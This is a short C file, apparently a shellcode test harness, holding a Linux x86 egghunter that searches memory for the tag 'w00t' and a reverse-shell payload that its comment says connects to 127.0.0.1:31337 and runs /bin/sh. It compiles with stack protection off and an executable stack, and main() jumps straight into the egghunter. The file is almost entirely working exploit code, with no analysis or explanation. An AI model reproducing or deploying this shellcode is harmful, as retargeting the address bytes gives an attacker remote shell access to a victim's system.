/* Compilation: gcc -fno-stack-protector -z execstack shellcode.c -o shellcode */

#include<stdio.h>
#include<string.h>

#define EGG "\x77\x30\x30\x74"	/* w00t */

unsigned char egghunter[] = \
			"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42"
			"\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2"
			"\x74\xee\xb8"
			EGG
			"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


				/* tcp reverse shell to 127.0.0.1:31337 */
unsigned char code[] =  \
			EGG
			EGG
			"\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1"
			"\x6a\x66\x58\x89\xc7\xcd\x80\x97\x68\x7f"
			"\x00\x00\x01\x66\x68\x7a\x69\x66\x6a\x02"
			"\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x03"
			"\xcd\x80\x5b\x87\xca\xb0\x3f\xcd\x80\x49"
			"\x79\xf9\x99\x89\xd1\x52\x68\x2f\x2f\x73"
			"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b"
			"\xcd\x80";


main()
{
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())egghunter;
	ret();
}

	
